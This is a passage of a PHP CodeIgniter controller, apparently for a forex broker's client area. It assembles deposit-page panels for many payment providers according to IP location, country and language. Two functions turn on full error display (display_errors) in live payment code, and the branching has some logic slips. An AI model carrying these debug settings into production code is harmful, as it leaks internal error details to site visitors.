            $data['show_deposit'] = '';
            if (IPLOC::Office_and_Vpn()) {
                //r1 c1 alternate
                $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
                $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);

                //r4 c1234 office
                $pnl['panel_hipay'] = $this->load->view('deposit_widget/hipay', null, true);

                //r5 c1234 office
                $pnl['panel_payments'] = $this->load->view('deposit_widget/payments', null, true);
                $pnl['panel_paymill'] = $this->load->view('deposit_widget/paymill', null, true);

                if (FXPP::html_url() == 'de' or $q['country'] == 'DE') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
//                        $data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    // $data['show_deposit'].=$pnl['panel_bitcoin']; vic
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_hipay'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_payments'];
//                        $data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';

                    $data['show_deposit'] .= $pnl['panel_paymill'];
                    $data['show_deposit'] .= '</div>';

                //office only
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= '</div>';

                    //office only
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_hipay'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payments'];
                    $data['show_deposit'] .= $pnl['panel_paymill'];
                    $data['show_deposit'] .= '</div>';
                    //office only
                }

                //modal
                $pnl['panel_new_malay_modal'] = $this->load->view('deposit_widget/new-malay-modal', null, true);
                $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
                $data['show_modal'] = $pnl['panel_new_indo_modal'].$pnl['panel_new_malay_modal'];
            //modal
            } elseif (IPLoc::for_id_only() or $q['country'] == 'ID') {
                //r1 c1 alternate

                $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
//                $data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];

                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payco'];
//                $data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= '</div>';
                }

                $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
                $data['show_modal'] = $pnl['panel_new_indo_modal'];
            } elseif (IPLoc::for_my_only() or $q['country'] == 'MY') {
                $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);

                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    // $data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];

                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    //  $data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= '</div>';
                }

                $pnl['panel_new_malay_modal'] = $this->load->view('deposit_widget/new-malay-modal', null, true);
                $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
                $data['show_modal'] = $pnl['panel_new_malay_modal'];
            } elseif (IPLoc::for_my_only() or $q['country'] == 'DE') {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_sofort'];
                $data['show_deposit'] .= $pnl['panel_banktransfer'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= $pnl['panel_skrill'];

                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_paypal'];
                $data['show_deposit'] .= $pnl['panel_yandexmoney'];

                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_megatransfer'];
                $data['show_deposit'] .= $pnl['panel_bitcoin'];

                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= '</div>';
            } else {
                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    //$data['show_deposit'].= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    //$data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    //$data['show_deposit'].= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    //$data['show_deposit'].=$pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= '</div>';
                }

                $data['show_modal'] = '';
            }

            $this->template->title(lang('dep_tit'))
                ->set_layout('internal/main')
                ->prepend_metadata('')
                ->build('deposits/deposit', $data);
        } else {
            redirect('signout');
        }
    }

    public function depositPage()
    {
        $this->lang->load('depositwithdraw');
        $user_id = $this->session->userdata('user_id');
        $mtas2 = $this->general_model->showssingle($table = 'mt_accounts_set', $id = 'user_id', $field = $user_id, $select = 'mt_currency_base');

        switch ($mtas2['mt_currency_base']) {
            case 'RUB':
                $depositAmount = ['1000000', '500000', '300000', '100000', '50000', '30000', '10000 ', '5000', '3000', '1000', '500'];
                $currency1 = '<i class="fa fa-rub" aria-hidden="true"></i>';
                $currency2 = '<i class="fa fa-rub" aria-hidden="true"></i>';
                break;
            case 'GBP':
                $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                $currency1 = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                $currency2 = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                break;
            case 'EUR':
                $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                $currency1 = '<i class="fa fa-eur" aria-hidden="true"></i>';
                $currency2 = '<i class="fa fa-eur" aria-hidden="true"></i>';
                break;
            default:
                $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                $currency1 = '<i class="fa fa-usd" aria-hidden="true"></i>';
                $currency2 = '<i class="fa fa-usd" aria-hidden="true"></i>';
        }

        $data['depositAmount'] = $depositAmount;
        $data['currency'] = $currency1;
        $data['currency2'] = $currency2;

        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        if ($this->session->userdata('logged')) {
            if (!IPLoc::Office()) {
                FXPP::LoginTypeRestriction();
            }
            $data['title_page'] = lang('sb_li_2');
            $data['active_tab'] = 'finance';
            $data['active_sub_tab'] = 'deposit';
            $data['metadata_description'] = lang('dep_dsc');
            $data['metadata_keyword'] = lang('dep_kew');

            //r1 c1234
            $pnl['panel_banktransfer'] = $this->load->view('deposit_widget/banktransfer', null, true);
            $pnl['panel_visa_mastercard'] = $this->load->view('deposit_widget/visa-mastercard', null, true);
            $pnl['panel_skrill'] = $this->load->view('deposit_widget/skrill', null, true);
            $pnl['panel_neteller'] = $this->load->view('deposit_widget/neteller', null, true);

            //r2 c1234
            $pnl['panel_paxum'] = $this->load->view('deposit_widget/paxum', null, true);
            $pnl['panel_paypal'] = $this->load->view('deposit_widget/paypal', null, true);
            $pnl['panel_webmoney'] = $this->load->view('deposit_widget/webmoney', null, true);
            $pnl['panel_payco'] = $this->load->view('deposit_widget/payco', null, true);

            //r3 c1234
            $pnl['panel_paysera'] = $this->load->view('deposit_widget/paysera', null, true);
            $pnl['panel_qiwi'] = $this->load->view('deposit_widget/qiwi', null, true);
            $pnl['panel_megatransfer'] = $this->load->view('deposit_widget/megatransfer', null, true);
            $pnl['panel_bitcoin'] = $this->load->view('deposit_widget/bitcoin', null, true);

            $pnl['panel_yandexmoney'] = $this->load->view('deposit_widget/yandexmoney', null, true);

            $data['show_deposit'] = '';
//            IPLOC::Office()
//            IPLoc::for_id_only()
//            IPLoc::for_my_only()
            if (IPLOC::Office_and_Vpn()) {
                //r1 c1 alternate
                $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
                $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);

                //r4 c1234 office
                $pnl['panel_hipay'] = $this->load->view('deposit_widget/hipay', null, true);
                $pnl['panel_sofort'] = $this->load->view('deposit_widget/sofort', null, true);
                $pnl['panel_deposit_monetaru'] = $this->load->view('deposit_widget/deposit-monetaru', null, true);
                //r5 c1234 office

                $pnl['panel_payments'] = $this->load->view('deposit_widget/payments', null, true);
                $pnl['panel_paymill'] = $this->load->view('deposit_widget/paymill', null, true);

                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_paysera'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= '</div>';

                    //office only
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_hipay'];

                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payments'];
                    $data['show_deposit'] .= $pnl['panel_paymill'];
                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];

                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= '</div>';

                    //office only
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_hipay'];
                    $data['show_deposit'] .= $pnl['panel_sofort'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payments'];
                    $data['show_deposit'] .= $pnl['panel_paymill'];
                    $data['show_deposit'] .= '</div>';
                }

                //office only
                //modal
                $pnl['panel_new_malay_modal'] = $this->load->view('deposit_widget/new-malay-modal', null, true);
                $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
                $data['show_modal'] = $pnl['panel_new_indo_modal'].$pnl['panel_new_malay_modal'];
            //modal
//                IPLOC::Office()
//              IPLoc::for_id_only()
            } elseif (IPLoc::for_id_only()) {
                //r1 c1 alternate

                $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_indo'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= '</div>';
                }

                $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
                $data['show_modal'] = $pnl['panel_new_indo_modal'];
            //IPLOC::Office()
//IPLoc::for_my_only()
            } elseif (IPLoc::for_my_only()) {
                $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);
                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_malay'];
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    $data['show_deposit'] .= $pnl['panel_webmoney'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];

                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= '</div>';
                }

                $pnl['panel_new_malay_modal'] = $this->load->view('deposit_widget/new-malay-modal', null, true);
                $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
                $data['show_modal'] = $pnl['panel_new_malay_modal'];
            } else {
                if (FXPP::html_url() == 'de') {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    //$data['show_deposit'].= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= '</div>';
                } else {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_banktransfer'];
                    $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_paypal'];
                    //$data['show_deposit'].= $pnl['panel_webmoney'];
                    $data['show_deposit'] .= $pnl['panel_yandexmoney'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paysera'];
                    $data['show_deposit'] .= $pnl['panel_qiwi'];
                    $data['show_deposit'] .= $pnl['panel_megatransfer'];
                    $data['show_deposit'] .= $pnl['panel_bitcoin'];
                    $data['show_deposit'] .= '</div>';
                }

                $data['show_modal'] = '';
            }

            $mtas3 = $this->general_model->showssingle($table = 'users', $id = 'id', $field = $user_id, $select = 'login_type');
            $data['login_type'] = $mtas3['login_type'];

            $nuser_id = $this->session->userdata('new_reg_id');

//            unset($pnl);
            $this->template->title(lang('dep_tit'))
                ->set_layout('internal/main')
                ->prepend_metadata('')
                ->build('deposits/depositNewLayout', $data);
        } else {
            // redirect('signout');
            $_SESSION['redirect'] = $this->config->item('domain-my').$_SERVER['REQUEST_URI'];
            redirect('client/signin');
        }
    }

    private function deposit_finance()
    {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
        $this->lang->load('depositwithdraw');
        $this->lang->load('sidebar');

        if ($this->session->userdata('logged')) {
            //**my_account/index /
            $_SESSION['redirect'] = null;
            //**End**//

            if (!IPLoc::Office()) {
                FXPP::LoginTypeRestriction();
            }

            $user_id = $this->session->userdata('user_id');

